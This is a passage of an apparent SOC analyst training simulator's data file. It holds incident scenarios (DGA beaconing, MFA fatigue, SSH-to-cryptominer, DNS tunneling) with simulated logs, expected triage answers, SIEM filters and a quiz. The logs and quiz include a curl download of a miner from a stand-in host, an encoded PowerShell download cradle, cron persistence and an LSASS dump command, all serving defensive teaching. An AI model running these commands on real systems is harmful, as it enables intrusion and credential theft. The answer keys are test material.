      ev(["11:15:30", "sysmon", "Sysmon (WKSTN-102)", "3", "Network connection", "WKSTN-102", "Image: svchost.exe (Temp) | Src: 10.10.20.102:52002 | Dst: 104.248.10.5:443 | Proto: TCP (60s interval)"]),
      ev(["11:30:00", "security", "Security (WKSTN-102)", "4688", "A new process has been created", "WKSTN-102", "NewProcess: C:\\Users\\tpark\\AppData\\Local\\Temp\\svchost.exe | Parent: powershell.exe | Signed: false"]),
      ev(["11:31:00", "security", "Security (WKSTN-102)", "4698", "A scheduled task was created", "WKSTN-102", "TaskName: FontCacheUpdate | Action: C:\\Users\\tpark\\AppData\\Local\\Temp\\svchost.exe | Trigger: Every 15 min"])
    ],
    processes: [
      pr([1, null, "powershell.exe", "powershell.exe (download + drop stage)", "acorp\\t.park", "Medium", true]),
      pr([2, 1, "C:\\Users\\tpark\\AppData\\Local\\Temp\\svchost.exe", "svchost.exe (MASQUERADED - unsigned, in Temp)", "acorp\\t.park", "Medium", true]),
      pr([3, 2, "svchost.exe (Temp)", "DGA: hundreds of NXDOMAIN queries (x7k9m2..., a3b5c7...) + C2 to 104.248.10.5:443", "acorp\\t.park", "Medium", true])
    ],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P3",
      actions: ["isolate-host", "block-domain", "delete-artifact", "esc-l2", "monitor"],
      mitre: ["T1568.002", "T1071.004", "T1053.005"],
      reasoning: "TRUE POSITIVE — DGA + C2. An unsigned binary masquerading as svchost.exe (running from %TEMP%, not System32) generates hundreds of high-entropy NXDOMAIN DNS queries (classic DGA seed-resolution pattern, T1568.002 / T1071.004), then connects on a regular interval to a VPS. A scheduled task keeps it alive. Severity MEDIUM/P3 (C2 pattern confirmed on a standard workstation, no data exfil or lateral movement yet). Isolate the host, block the DGA domain and C2 IP, remove the task, and escalate to L2 for beacon-frequency analysis across the fleet."
    },
    keyEvidence: [
      { id: "search-entropy", keyword: "NXDOMAIN" },
      { id: "intel-x7k9m2p4q1w3e5r7t9y.example.com" },
      { id: "process-tree" }
    ]
  },

  {
    id: "mfa-fatigue",
    title: "MFA Fatigue Attack on CFO",
    difficulty: "Hard",
    category: "Identity/Cloud",
    summary: "A storm of MFA push prompts to the CFO's phone from Russia, one finally approved, then self-granted Global Admin and mail forwarding.",
    alert: {
      rule: "Cloud Identity - Multiple MFA Denials Then Approval",
      severity: "High",
      ts: "2024-01-15 22:56:00 UTC",
      host: "— (Entra ID)",
      user: "c.garcia",
      ips: ["91.219.236.245"],
      domains: [],
      hashes: [],
      mitreHint: "T1621 (MFA fatigue)"
    },
    entities: { host: "Entra ID", user: "c.garcia" },
    assets: {
      "Entra ID": { role: "Identity provider (Azure AD / Entra ID)", tier: "Tier 0", os: "Cloud", edr: "N/A", owner: "Identity team", note: "Controls access to Microsoft 365 + all cloud apps." }
    },
    users: {
      "c.garcia": { dept: "Finance", title: "Chief Financial Officer (CFO)", groups: ["CFO", "Finance Leadership"], mfa: "Enabled (MS Authenticator)", lastPw: "2023-07-01", risk: "High-value user (financial authority)", note: "Also a Privileged Role Administrator." }
    },
    intel: {
      "91.219.236.245": { vt: "52/92", abuse: "96% confidence", geo: "Russia", notes: "Known source of MFA fatigue / credential-stuffing campaigns. High confidence malicious." }
    },
    events: [
      ev(["22:50:00", "cloud", "Microsoft Entra ID", "SIGNIN", "MFA push prompt", "—", "User: c.garcia@corp.local | MFA: Push sent | IP: 91.219.236.245 | Device: Unknown (Firefox on Windows)"]),
      ev(["22:51:00", "cloud", "Microsoft Entra ID", "SIGNIN", "MFA push DENIED", "—", "User: c.garcia | MFA: Denied by user | IP: 91.219.236.245"]),
      ev(["22:52:00", "cloud", "Microsoft Entra ID", "SIGNIN", "MFA push prompt", "—", "User: c.garcia | MFA: Push sent | IP: 91.219.236.245"]),
      ev(["22:53:00", "cloud", "Microsoft Entra ID", "SIGNIN", "MFA push DENIED", "—", "User: c.garcia | MFA: Denied by user | IP: 91.219.236.245"]),
      ev(["22:54:00", "cloud", "Microsoft Entra ID", "SIGNIN", "MFA push prompt", "—", "User: c.garcia | MFA: Push sent | IP: 91.219.236.245"]),
      ev(["22:55:00", "cloud", "Microsoft Entra ID", "SIGNIN", "MFA push prompt", "—", "User: c.garcia | MFA: Push sent | IP: 91.219.236.245"]),
      ev(["22:56:00", "cloud", "Microsoft Entra ID", "SIGNIN", "MFA push APPROVED", "—", "User: c.garcia | MFA: Approved | IP: 91.219.236.245 | NOTE: approved from a different device (Safari on macOS)"]),
      ev(["22:56:30", "cloud", "Microsoft Entra ID", "AUDIT", "Privileged role granted", "—", "User: c.garcia | Role: Global Administrator | Performed by: c.garcia (self-grant)"]),
      ev(["22:57:00", "cloud", "Microsoft Entra ID", "AUDIT", "Mailbox rule created", "—", "User: c.garcia | Rule: forward all mail to external@protonmail.com"]),
      ev(["22:58:00", "security", "Security (DC01)", "4624", "An account was successfully logged on", "—", "Account: c.garcia | LogonType: 3 (Network) | Source: 91.219.236.245 | AuthPackage: Kerberos"]),
      ev(["23:00:00", "cloud", "Microsoft Entra ID", "AUDIT", "MFA method added", "—", "User: c.garcia | Added authenticator app (new device)"])
    ],
    processes: [],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["disable-account", "reset-password", "block-ip", "esc-l2", "notify-manager"],
      mitre: ["T1621", "T1078.001", "T1098.001"],
      reasoning: "TRUE POSITIVE — MFA fatigue (push-bombing) succeeded. Six MFA prompts from a Russian IP, four denied by the (sleeping?) user, until one was approved from a DIFFERENT device. The attacker then self-granted Global Administrator (T1098.001), created a mail-forwarding rule, added their own authenticator, and authenticated to the domain. This is a confirmed privileged-cloud compromise (T1621 + T1078). Severity HIGH/P2 (privileged account compromise with tenant-level impact, could hit P1). Disable the account NOW, reset credentials + remove added MFA methods, revoke sessions, block the IP, and escalate to L2/IR."
    },
    keyEvidence: [
      { id: "search-MFA", keyword: "MFA" },
      { id: "user-c.garcia" },
      { id: "intel-91.219.236.245" }
    ]
  },

  {
    id: "linux-crypto",
    title: "Linux SSH Compromise → Crypto Mining",
    new: true,
    difficulty: "Medium",
    category: "Impact",
    summary: "SSH brute force succeeds via a stolen key, then curl pulls a miner to /tmp and a cron job makes it persist — resource hijacking on an internet-facing web server.",
    alert: {
      rule: "EDR - Resource Hijacking - High CPU + Mining Pool Connection",
      severity: "High",
      ts: "2024-01-18 22:41:05 UTC",
      host: "LINUX-APP-01",
      user: "ubuntu",
      ips: ["198.51.100.77", "203.0.113.66"],
      domains: ["mining.pool.example.net"],
      hashes: ["d41d8cd98f00b204e9800998ecf8427e"],
      mitreHint: "T1496 (resource hijacking) / T1110 (SSH brute force)"
    },
    entities: { host: "LINUX-APP-01", user: "ubuntu" },
    assets: {
      "LINUX-APP-01": { role: "Public web application server", tier: "Tier 1", os: "Ubuntu 22.04 LTS", edr: "Healthy (auditd + Falco)", owner: "IT Ops", note: "Internet-facing; hosts the customer portal." }
    },
    users: {
      "ubuntu": { dept: "IT Ops", title: "Deployment account", groups: ["sudo"], mfa: "SSH key only", lastPw: "2023-11-02", risk: "Shared deploy account, no MFA" },
      "root": { dept: "IT Ops", title: "Root", groups: ["root"], mfa: "SSH key", lastPw: "2022-06-14", risk: "Privileged" }
    },
    intel: {
      "198.51.100.77": { vt: "18/92", abuse: "84% confidence", geo: "Unknown (abuse-host)", notes: "Documented Monero mining pool endpoint. Also served xmrig binaries directly over HTTP." },
      "203.0.113.66": { vt: "9/92", abuse: "77% confidence", geo: "Germany", notes: "Compromised VPS used as a jump box; observed in multiple SSH brute-force campaigns (T1110)." },
      "mining.pool.example.net": { vt: "n/a", abuse: "n/a", geo: "—", notes: "Mining pool domain. No legitimate business relationship with this org." },
      "d41d8cd98f00b204e9800998ecf8427e": { vt: "n/a", abuse: "n/a", geo: "—", notes: "MD5 of an empty string — attacker avoided a real hash match, a laundering trick (T1036)." }
    },
    events: [
      ev(["20:11:24", "auth", "auth.log (LINUX-APP-01)", "AUTH", "sshd failed password for ubuntu", "LINUX-APP-01", "Failed password for ubuntu from 203.0.113.66 port 51222 ssh2 | x8 failures this minute"]),
      ev(["20:12:09", "auth", "auth.log (LINUX-APP-01)", "AUTH", "sshd failed password for root", "LINUX-APP-01", "Failed password for root from 203.0.113.66 | pattern: username spray"]),
      ev(["20:47:31", "auth", "auth.log (LINUX-APP-01)", "AUTH", "sshd failed password for ubuntu", "LINUX-APP-01", "Failed password for ubuntu from 203.0.113.66 | continued spray"]),
      ev(["21:05:18", "auth", "auth.log (LINUX-APP-01)", "AUTH", "sshd accepted publickey for ubuntu", "LINUX-APP-01", "Accepted publickey for ubuntu from 203.0.113.66 | key fingerprint 2f:9d:... matches a rotated key marked as revoked"]),
      ev(["21:05:20", "audit", "auditd (LINUX-APP-01)", "EXEC", "execve /usr/bin/curl", "LINUX-APP-01", "execve /usr/bin/curl | argv: curl -o /tmp/xmrig http://198.51.100.77/xmrig | uid=1000(ubuntu)"]),
      ev(["21:05:28", "audit", "auditd (LINUX-APP-01)", "EXEC", "execve /tmp/xmrig", "LINUX-APP-01", "execve /tmp/xmrig | argv: /tmp/xmrig --algo rx/0 -o pool:3333 --user acct_x7q9k | uid=1000(ubuntu)"]),
      ev(["21:05:40", "audit", "auditd (LINUX-APP-01)", "FILE", "authorized_keys modified", "LINUX-APP-01", "~/.ssh/authorized_keys for ubuntu appended: ssh-ed25519 AAAAC3NzaC1l... (persistence)"]),
      ev(["21:06:00", "audit", "auditd (LINUX-APP-01)", "FILE", "crontab modified", "LINUX-APP-01", "/etc/cron.d/miner created | Entry: * * * * * root /tmp/xmrig --daemon"]),
      ev(["21:07:11", "sysmon", "Falco (LINUX-APP-01)", "3", "Network connection", "LINUX-APP-01", "Process: /tmp/xmrig | Src: 10.20.1.15:34512 | Dst: 198.51.100.77:3333 | Proto: TCP | mining pool"]),
      ev(["22:15:00", "sysmon", "Falco (LINUX-APP-01)", "CPU", "Resource usage spike", "LINUX-APP-01", "/tmp/xmrig consuming 640% CPU (16 cores saturated) | up for 70 min"]),
      ev(["22:41:05", "sysmon", "Falco (LINUX-APP-01)", "ALERT", "Alert: Resource hijacking", "LINUX-APP-01", "Suspicious binary in /tmp with outbound connection to mining pool + cron persistence + high CPU"])
    ],
    processes: [
      pr([1, null, "sshd", "/usr/sbin/sshd -D", "root", "root", false]),
      pr([2, 1, "bash", "bash (SSH session for ubuntu via publickey)", "ubuntu", "ubuntu", true]),
      pr([3, 2, "curl", "curl -o /tmp/xmrig http://198.51.100.77/xmrig", "ubuntu", "ubuntu", true]),
      pr([4, 2, "xmrig", "/tmp/xmrig --algo rx/0 -o pool:3333 --user acct_x7q9k", "ubuntu", "ubuntu", true]),
      pr([5, 4, "cron", "/etc/cron.d/miner -> /tmp/xmrig --daemon (persistence)", "root", "root", true])
    ],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["isolate-host", "block-ip", "block-domain", "disable-account", "delete-artifact", "esc-l2"],
      mitre: ["T1110.001", "T1078.001", "T1059.004", "T1105", "T1053.003", "T1496"],
      reasoning: "TRUE POSITIVE — resource hijacking (crypto mining). The box was brute-forced over SSH (T1110), the attacker got in with a stolen/revoked key (T1078, note the 'revoked key' detail), downloaded xmrig to /tmp via curl (T1105), added their own SSH key + a /etc/cron.d entry for persistence (T1053.003), and beaconed to a documented mining pool (T1496). Tier-1 internet-facing server with 640% CPU means business impact. Severity HIGH/P2. Contain: isolate the host, block the pool IP/domain, rotate the account keys, remove the cron entry + backdoor key, then escalate to L2."
    },
    keyEvidence: [
      { id: "intel-198.51.100.77" },
      { id: "user-ubuntu" },
      { id: "search-xmrig", keyword: "xmrig" },
      { id: "search-cron", keyword: "cron" }
    ]
  },

  {
    id: "dns-tunnel",
    title: "DNS Tunneling — Data Exfiltration",
    new: true,
    difficulty: "Medium",
    category: "Network",
    summary: "An R&D workstation makes thousands of long high-entropy DNS queries to a freshly registered domain; TXT answers carry a compressed archive of stolen files.",
    alert: {
      rule: "DNS - Abnormal Volume of High-Entropy TXT Queries",
      severity: "High",
      ts: "2024-01-20 14:02:31 UTC",
      host: "WKS-0417",
      user: "r.singh",
      ips: ["203.0.113.88"],
      domains: ["cdn-update-host.com"],
      hashes: [],
      mitreHint: "T1071.004 (DNS) / T1048.001 (exfil over DNS)"
    },
    entities: { host: "WKS-0417", user: "r.singh" },
    assets: {
      "WKS-0417": { role: "R&D workstation (prototype source)", tier: "Tier 2", os: "Windows 11", edr: "Healthy (CrowdStrike)", owner: "R&D dept", note: "Holds access to the code repository. High-value target." }
    },
    users: {
      "r.singh": { dept: "R&D", title: "Principal Engineer", groups: ["R&D", "Developers"], mfa: "Enabled", lastPw: "2023-12-18", risk: "Local admin on workstation" }
    },
    intel: {
      "cdn-update-host.com": { vt: "n/a", abuse: "n/a", geo: "—", notes: "Registered 2024-01-15 (5 days ago) via a privacy registrar. No legitimate CDN footprint — name is a decoy for the real traffic." },
      "203.0.113.88": { vt: "12/92", abuse: "80% confidence", geo: "Unknown", notes: "Authoritative NS for cdn-update-host.com. Known DNSCat2 listener infrastructure." }
    },
    events: [
      ev(["13:40:00", "sysmon", "Sysmon (WKS-0417)", "1", "Process Create", "WKS-0417", "Image: powershell.exe | Parent: OUTLOOK.EXE | User: acorp\\r.singh | CmdLine: powershell.exe -enc <encoded download>"]),
      ev(["13:41:12", "sysmon", "Sysmon (WKS-0417)", "22", "DNS query", "WKS-0417", "Query: 3b7f8a91c2d4e6... (64-char base64).cdn-update-host.com | Type: TXT"]),
      ev(["13:41:16", "sysmon", "Sysmon (WKS-0417)", "22", "DNS query", "WKS-0417", "Query: e2a4f9c81b3d0...cdn-update-host.com | Type: TXT | high entropy, ~60 chars"]),
      ev(["13:41:20", "sysmon", "Sysmon (WKS-0417)", "22", "DNS query", "WKS-0417", "Query: 9c1b0a2f7d4e...cdn-update-host.com | Type: TXT | queries every ~4 seconds"]),
      ev(["13:44:00", "sysmon", "Sysmon (WKS-0417)", "22", "DNS query", "WKS-0417", "Query: <base64>.cdn-update-host.com | Type: TXT | Response: TXT 'UEsDBA...' (base64 ZIP header signature)"]),
      ev(["13:50:00", "proxy", "Proxy (CORP-GW)", "HTTP", "Blocked / no outbound HTTP", "WKS-0417", "No direct internet HTTP(S) traffic from host — only DNS queries leaving the estate"]),
      ev(["13:55:00", "sysmon", "Sysmon (WKS-0417)", "22", "DNS query", "WKS-0417", "Query: <base64>.cdn-update-host.com | Type: TXT | Response: TXT 'Q2xhc3NpZmllZC...' (classifier text)"]),
      ev(["14:00:30", "sysmon", "Sysmon (WKS-0417)", "22", "DNS query", "WKS-0417", "Query: <base64>.cdn-update-host.com | Type: TXT | Response: TXT 'UEsDBBQAAAAIA...' (continued ZIP stream)"]),
      ev(["14:02:31", "sysmon", "Sysmon (WKS-0417)", "22", "DNS query", "WKS-0417", "~2,300 TXT queries to cdn-update-host.com in the last 20 min | total ~1.4 MB transferred via DNS"])
    ],
    processes: [
      pr([1, null, "OUTLOOK.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "acorp\\r.singh", "Medium", false]),
      pr([2, 1, "powershell.exe", "powershell.exe -enc <encoded download cradle>", "acorp\\r.singh", "Medium", true]),
      pr([3, 2, "powershell.exe", "dnscat2 client (DNS tunneling agent)", "acorp\\r.singh", "Medium", true]),
      pr([4, 3, "dnscat2.exe", "C:\\Users\\rsingh\\AppData\\Local\\Temp\\dnscat2.exe (tunnel process)", "acorp\\r.singh", "Medium", true])
    ],
    encodedCommands: ["SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAZABuAC0AdQBwAGQAYQB0AGUALQBoAG8AcwB0AC4AYwBvAG0ALwBkAG4AcwBjAGEAdAAuAHAAcwAxACcAKQA="],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["isolate-host", "block-domain", "block-ip", "esc-l2"],
      mitre: ["T1027.010", "T1105", "T1071.004", "T1048.001"],
      reasoning: "TRUE POSITIVE — DNS tunneling exfiltration (T1048.001). A phishing-adjacent encoded PowerShell (T1027.010) downloaded a DNSCat2 client (T1105) which beaconed via DNS to a 5-day-old domain (T1071.004). The tell: ~2,300 high-entropy TXT queries in 20 min, with TXT answers containing base64 ZIP headers (UEsDB...) — an archive is leaving the network inside DNS responses, bypassing the proxy that blocks all other outbound HTTP. Severity HIGH/P2: confirmed data exfiltration from an R&D workstation holding source code (could be P1 with DLP confirmation). Isolate the host, block the domain + NS IP at the DNS layer, and escalate to IR/L2 immediately."
    },
    keyEvidence: [
      { id: "intel-cdn-update-host.com" },
      { id: "search-TXT", keyword: "TXT" },
      { id: "decode-base64" },
      { id: "process-tree" }
    ]
  }
];

/* preset SIEM queries available on the investigation screen */
const PRESET_QUERIES = [
  { label: "All events", filter: null },
  { label: "Failed logons (4625)", filter: ev => ev.id === "4625" },
  { label: "Successful logons (4624/4672)", filter: ev => ev.id === "4624" || ev.id === "4672" },
  { label: "Process creation (4688/Sysmon 1)", filter: ev => ev.id === "4688" || (ev.id === "1" && ev.type === "sysmon") },
  { label: "Network connections (Sysmon 3)", filter: ev => ev.id === "3" && ev.type === "sysmon" },
  { label: "Persistence (4698/7045/Run)", filter: ev => ev.id === "4698" || ev.id === "7045" || /currentversion\\run/i.test(ev.detail) || ev.id === "13" },
  { label: "Credential access (Sysmon 10/11, lsass)", filter: ev => ev.id === "10" || /lsass/i.test(ev.detail) || /ntds/i.test(ev.detail) },
  { label: "Kerberos (4769/4771)", filter: ev => ev.id === "4769" || ev.id === "4771" },
  { label: "DNS queries (Sysmon 22)", filter: ev => ev.id === "22" && ev.type === "sysmon" },
  { label: "Defense evasion (1102/4719)", filter: ev => ev.id === "1102" || ev.id === "4719" },
  { label: "Email events", filter: ev => ev.type === "email" },
  { label: "Cloud identity events", filter: ev => ev.type === "cloud" }
];

const QUIZ = [
  { q: "Event 4624 with LogonType 10 indicates which type of logon?",
    o: ["Remote Interactive (RDP)", "Local console", "Network (SMB)", "Service"], a: 0, tag: "Events",
    e: "LogonType 10 = RemoteInteractive, i.e. an RDP session. Type 2 = interactive console, Type 3 = network, Type 5 = service." },
  { q: "Event 4625 with Status 0xC000006A means:",
    o: ["Wrong password (bad credentials)", "Account disabled", "Bad username", "Account locked out"], a: 0, tag: "Events",
    e: "0xC000006A = wrong password - the classic brute-force / password-spray failure code. 0xC000006D = bad username (enumeration)." },
  { q: "Which Event ID fires when the Windows Security audit log is cleared?",
    o: ["1102", "4719", "7045", "4720"], a: 0, tag: "Events",
    e: "Event 1102 = audit log cleared, a key anti-forensics indicator (T1070.001). Always investigate who cleared it and what happened before/after." },
  { q: "Sysmon Event ID 1 captures:",
    o: ["Process Create (with full command line + hashes)", "Network connections", "DNS queries", "Registry changes"], a: 0, tag: "Sysmon",
    e: "Sysmon EID 1 always includes the full command line, parent GUID + command line, hashes, integrity level, and OriginalFileName - superior to Windows 4688." },
  { q: "Which Sysmon Event ID detects a process opening LSASS memory (credential dumping)?",
    o: ["10 (ProcessAccess)", "8 (CreateRemoteThread)", "3 (Network)", "13 (Registry set)"], a: 0, tag: "Sysmon",
    e: "EID 10 logs OpenProcess calls. SourceImage=powershell/mimikatz, TargetImage=lsass.exe, GrantedAccess incl. 0x1000/0x1010/0x1FFFFF = credential theft (T1003.001)." },
  { q: "Sysmon Event ID 8 indicates:",
    o: ["CreateRemoteThread - cross-process code injection", "Process tampering", "Driver load", "Pipe creation"], a: 0, tag: "Sysmon",
    e: "EID 8 = CreateRemoteThread, the classic code-injection primitive (T1055). High-value targets: lsass, svchost, explorer, browsers." },
  { q: "Sysmon Event ID 22 logs:",
    o: ["DNS queries", "Clipboard changes", "WMI subscriptions", "Named pipes"], a: 0, tag: "Sysmon",
    e: "EID 22 = DNS queries. Look for DGA (high entropy, NXDOMAIN), tunneling (long labels, TXT), and non-browser processes querying DNS (T1071.004)." },
  { q: "Process tree: OUTLOOK.EXE → WINWORD.EXE → powershell.exe -enc ... most strongly suggests:",
    o: ["Phishing with a macro / OLE document", "Legitimate software update", "A scheduled maintenance script", "EDR self-scan"], a: 0, tag: "Triage",
    e: "Office → shell is the signature of macro/phishing initial access (T1566.001 → T1059.001). The parent chain reveals the vector." },
  { q: "Your first action when an alert lands in your queue is to:",
    o: ["Parse the alert metadata (rule, entities, time)", "Immediately block the source IP", "Isolate the host", "Call the SOC manager"], a: 0, tag: "Triage",
    e: "Triage starts by parsing: what triggered it, which host/user/process, and when. Containment and escalation decisions come after context." },
  { q: "What is the difference between a False Positive and a Benign Positive?",
    o: ["FP = detection logic error (no malicious activity); BP = alert correctly fired on authorized activity", "They are the same thing", "FP = real attack; BP = test attack", "FP means unknown; BP means confirmed"], a: 0, tag: "Concepts",
    e: "FP: the rule fired but there is no malicious activity (bad logic/data). BP: the rule correctly identified activity that turns out to be authorized (admin script, vuln scanner)." },
  { q: "Service accounts most commonly authenticate with which logon types?",
    o: ["4 (Batch) and 5 (Service)", "2 (Interactive) and 10 (RDP)", "3 (Network) and 8 (Cleartext)", "11 (Cached)"], a: 0, tag: "Events",
    e: "Batch (scheduled tasks) and Service. Interactive/RDP (2, 10) on a service account is a strong red flag." },
  { q: "Kerberoasting maps to which MITRE technique?",
    o: ["T1558.003", "T1110.003", "T1003.001", "T1550.002"], a: 0, tag: "MITRE",
    e: "T1558.003 Kerberoasting: requesting RC4 service tickets (4769, 0x17) to crack SPN account passwords offline." },
  { q: "Which ATT&CK tactic ID covers credential theft (LSASS, Kerberoasting)?",
    o: ["TA0006 Credential Access", "TA0001 Initial Access", "TA0008 Lateral Movement", "TA0003 Persistence"], a: 0, tag: "MITRE",
    e: "TA0006 = Credential Access (crown jewel: T1003.001 LSASS dumping)." },
  { q: "The P1 acknowledge SLA is:",
    o: ["15 minutes", "30 minutes", "2 hours", "8 hours"], a: 0, tag: "Severity",
    e: "P1: ack 15 min, contain 1 hr. P2: ack 30 min, contain 4 hrs. P3: ack 2 hrs. P4: 8 hrs / batch." },
  { q: "A P3 'Suspicious PowerShell' alert fires on a Domain Controller (Tier 0 asset). Final priority?",
    o: ["P2 (tier multiplier)", "P3 (unchanged)", "P1", "P4"], a: 0, tag: "Severity",
    e: "Asset tier multiplies severity: P3 on Tier 0 becomes P2 (or P1 in privileged context). Tier 0 compromise = keys to the kingdom." },
  { q: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <pid> <file> full is used to:",
    o: ["Dump LSASS and steal credentials", "Install a service", "Create a scheduled task", "Enumerate AD groups"], a: 0, tag: "Concepts",
    e: "comsvcs.dll MiniDump is a classic LOLBin credential dump (T1003.001) - often paired with Sysmon EID 10 showing the LSASS access." },
  { q: "Adding a value to HKCU\\...\\CurrentVersion\\Run maps to which MITRE technique?",
    o: ["T1547.001 (Registry Run Keys / Startup Folder)", "T1053.005 (Scheduled Task)", "T1543.003 (Service)", "T1134 (Token Manipulation)"], a: 0, tag: "MITRE",
    e: "Run/RunOnce keys are the most common persistence location (T1547.001). Detect via Sysmon EID 12/13 or 4657." },
  { q: "Which of these is a strong indicator of a DGA (domain generation algorithm)?",
    o: ["High-entropy domains with NXDOMAIN responses", "A static IP beaconing on 443", "Large HTTP POST to a CDN", "A single TLS connection"], a: 0, tag: "Concepts",
    e: "DGA: high-entropy hostnames, heavy NXDOMAIN volume, regular query intervals (T1568.002 / T1071.004)." },
  { q: "A Golden Ticket is:",
    o: ["A forged TGT signed with the krbtgt hash", "A dumped DA password", "A Pass-the-Hash attack", "A SAM registry dump"], a: 0, tag: "MITRE",
    e: "Golden ticket = forged TGT using the krbtgt account hash (T1558.001). Indicators: anomalous TGT lifetime, krbtgt password age > 180 days." },
  { q: "The common threshold for 'impossible travel' in sign-in analytics is:",
    o: ["Speed above ~1000 km/h between sign-ins", "Two different countries in a day", "Any new device", "A VPN exit IP"], a: 0, tag: "Concepts",
    e: "If two successful sign-ins imply travel faster than a plane (~1000 km/h), it is impossible-travel (with distance/time correlation)." },
  { q: "Event 4769 requests with TicketEncryptionType 0x17 (RC4) against service accounts indicate:",
    o: ["Kerberoasting", "Pass-the-Hash", "AS-REP roasting", "Golden ticket forgery"], a: 0, tag: "Events",
    e: "RC4 TGS-REQs (0x17) for SPN accounts, in volume, from one source = Kerberoasting (T1558.003)." },
  { q: "Which trait best describes C2 beaconing?",
    o: ["Regular interval, small packets, long-lived", "One huge random download", "A single burst then silence", "No outbound traffic"], a: 0, tag: "Concepts",
    e: "Beaconing: periodic, low-volume check-ins at a steady interval (with jitter) to the same destination (T1071.001)." },
  { q: "Which technique ID covers ransomware encryption of data?",
    o: ["T1486 (Data Encrypted for Impact)", "T1490 (Inhibit System Recovery)", "T1036 (Masquerading)", "T1567 (Exfil to Web)"], a: 0, tag: "MITRE",
    e: "T1486 = Data Encrypted for Impact. Watch also for T1490 (vssadmin delete shadows) alongside." },
  { q: "Event 4719 indicates:",
    o: ["System audit policy was changed", "A user was added to a group", "A service was installed", "The log was cleared"], a: 0, tag: "Events",
    e: "4719 = audit policy changed - an attacker disabling/altering logging to evade detection (T1562.002)." },
  { q: "What MUST be in an L1 → L2 escalation package?",
    o: ["Alert details, host/user context, process tree, command lines, network + TI, hashes, auth timeline, MITRE mapping, containment taken", "Just the alert ID", "A list of IPs", "The user's name"], a: 0, tag: "Triage",
    e: "A complete package lets L2 act immediately. Missing pieces force L2 to re-do your triage - the #1 escalation mistake." },
  { q: "Severity vs Priority: ransomware on a test-lab server (low business value) would be:",
    o: ["P1 severity but P3/P4 priority", "P1 priority automatically", "P4 severity", "Never escalated"], a: 0, tag: "Severity",
    e: "Severity = technical criticality (P1), priority = business urgency (downgraded on a test box). Severity ≠ priority." },
  { q: "Event 4672 fires when:",
    o: ["A logon has elevated (admin-equivalent) privileges", "A password is wrong", "A process is created", "An account is locked"], a: 0, tag: "Events",
    e: "4672 = special privileges assigned (SeDebug, SeTcb, etc.). 4624 Type 10 + 4672 = privileged RDP session - high value." },
  { q: "Spearphishing with an attachment maps to which tactic?",
    o: ["TA0001 Initial Access", "TA0002 Execution", "TA0003 Persistence", "TA0008 Lateral Movement"], a: 0, tag: "MITRE",
    e: "Phishing is Initial Access (TA0001); the technique is T1566.001 Spearphishing Attachment." },
  { q: "Which file path is most suspicious for a new executable in Sysmon EID 1/11?",
    o: ["C:\\Users\\<name>\\AppData\\Local\\Temp\\...", "C:\\Windows\\System32\\...", "C:\\Program Files\\...", "C:\\Windows\\Servicing\\..."], a: 0, tag: "Sysmon",
    e: "Temp/AppData execution = malware drop. System32/Program Files are expected locations for legitimate binaries." },
  { q: "MFA fatigue (push-bombing) maps to which technique?",
    o: ["T1621 (MFA Request Generation)", "T1110 (Brute Force)", "T1550 (Alternate Auth Material)", "T1566 (Phishing)"], a: 0, tag: "MITRE",
    e: "T1621 = flooding the user with push prompts until they accidentally approve. Detect via multiple denials then approval from a new device." },
  { q: "Which Event ID is raised when a scheduled task is created?",
    o: ["4698", "7045", "4720", "1102"], a: 0, tag: "Events",
    e: "4698 = scheduled task created (persistence, T1053.005). 7045 = service installed. Check Author, Command, and Trigger fields." },
  { q: "IOCs in a SOC ticket should be recorded as:",
    o: ["Structured Type / Value / Confidence / Source", "A paste of raw logs", "IPs only", "Notes in free text"], a: 0, tag: "Triage",
    e: "Structured IOCs (IPv4, domain, file hash, URL) with confidence + source make the ticket actionable and auditable." },
  { q: "A newly registered domain (< 30 days old) contacted by an internal host is best described as:",
    o: ["Suspicious - a common C2 / phishing pattern", "Always benign", "Patched automatically", "Irrelevant to triage"], a: 0, tag: "Concepts",
    e: "Young domains + odd TLDs + low traffic = common C2 infrastructure (T1583.001). Age/reputation is a core enrichment step." },
  { q: "Port 1433 in a network connection event most likely indicates:",
    o: ["MSSQL database traffic (xp_cmdshell lateral movement risk)", "NTP time sync", "SSH tunneling", "DNS resolution"], a: 0, tag: "Network",
    e: "TCP 1433 = MSSQL. Watch for xp_cmdshell / OLE automation abuse (T1190 / lateral movement) and large data pulls." },
  { q: "Which service does TCP port 445 commonly expose?",
    o: ["SMB (lateral movement, PsExec, ransomware)", "Kerberos", "RDP", "SNMP"], a: 0, tag: "Network",
    e: "445 = SMB. Heavy SMB from one host to many = worm/lateral movement (T1021.002); SMBv1 is especially risky." },
  { q: "A DNS query flood of long, high-entropy subdomains to one domain is a classic sign of:",
    o: ["DNS tunneling / data exfiltration", "Legitimate CDN routing", "A misconfigured mail server", "Local DNS caching"], a: 0, tag: "Network",
    e: "Long subdomains (>50 chars) with high entropy are the hallmark of DNS tunneling (T1048.001) — data hidden in query names, often TXT/NULL records." },
  { q: "Which DNS record type is commonly abused to exfiltrate data (base64 payload in responses)?",
    o: ["TXT", "A", "AAAA", "NS"], a: 0, tag: "Network",
    e: "TXT records can carry arbitrary text, so tunnellers use TXT (and NULL) to smuggle data. Spike in TXT queries = investigate." },
  { q: "Which DNS response code indicates a domain that does not exist, useful for spotting DGA-generated queries?",
    o: ["NXDOMAIN (3)", "NOERROR (0)", "SERVFAIL (2)", "REFUSED (5)"], a: 0, tag: "Network",
    e: "NXDOMAIN (3) = name not found. DGA malware queries many random domains that don't resolve, producing a high NXDOMAIN rate (T1568.002)." },
  { q: "An HTTP response 401 vs 403 tells you:",
    o: ["401 = not authenticated yet; 403 = authenticated but not allowed", "They mean the same thing", "403 = server crashed", "401 = resource moved"], a: 0, tag: "Web",
    e: "401 = authentication required/missing; 403 = forbidden (authenticated or otherwise denied). A 403 followed by many 200s can signal auth bypass probing." },
  { q: "Which OWASP risk is being exploited when user input is concatenated straight into an SQL query?",
